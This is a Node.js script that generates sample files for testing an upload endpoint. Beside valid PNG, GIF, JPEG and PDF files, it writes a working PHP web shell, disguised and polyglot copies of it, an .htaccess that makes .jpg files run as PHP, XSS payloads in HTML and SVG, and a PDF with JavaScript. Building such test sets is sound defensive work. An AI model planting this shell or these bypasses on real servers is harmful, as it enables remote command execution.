// Generates benign and malicious test files in samples/payloads/.
// The "malicious" files are harmless proof-of-concept payloads used only to
// show which uploads each endpoint accepts or rejects.
const fs = require('fs');
const path = require('path');

const OUT = path.join(__dirname, 'payloads');
fs.mkdirSync(OUT, { recursive: true });

// 1x1 transparent PNG
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64',
);
// 1x1 GIF
const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
// Minimal JPEG (SOI + JFIF APP0 + EOI)
const JPG = Buffer.from([
  0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
  0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xd9,
]);
const PDF = `%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >> endobj
trailer << /Root 1 0 R >>
%%EOF
`;
const PHP_SHELL = "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>\n";

const files = {
  // ---- legitimate files (should be accepted by both endpoints) ----
  'valid.png': PNG,
  'valid.gif': GIF,
  'valid.jpg': JPG,
  'valid.pdf': PDF,

  // ---- malicious files ----
  // Classic PHP web shell
  'shell.php': PHP_SHELL,
  // Double extension
  'shell.php.jpg': PHP_SHELL,
  // Script content disguised with an image extension
  'fake.png': PHP_SHELL,
  // Polyglot: genuine GIF magic bytes followed by PHP code
  'polyglot.gif': Buffer.concat([Buffer.from('GIF89a'), Buffer.from(';\n' + PHP_SHELL)]),
  // Stored XSS via HTML
  'xss.html': '<!DOCTYPE html><html><body><h1>Hacked</h1>'
    + '<script>alert("Stored XSS from uploaded file! Origin: " + document.domain)</script></body></html>\n',
  // Stored XSS via SVG image
  'xss.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">'
    + '<text x="10" y="30">SVG XSS</text><script>alert("XSS via SVG: " + document.domain)</script></svg>\n',
  // Apache config override that would make .jpg files execute as PHP
  '.htaccess': 'AddType application/x-httpd-php .jpg\n',
  // PDF with embedded JavaScript
  'malicious.pdf': PDF.replace('/Type /Catalog', '/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert("pwned")) >>'),
  // Valid JPEG header but 3 MB in size (DoS / storage exhaustion)
  'large.jpg': Buffer.concat([JPG.subarray(0, 20), Buffer.alloc(3 * 1024 * 1024, 0x41)]),
};

for (const [name, content] of Object.entries(files)) {
  fs.writeFileSync(path.join(OUT, name), content);
  console.log(`created samples/payloads/${name}`);
}
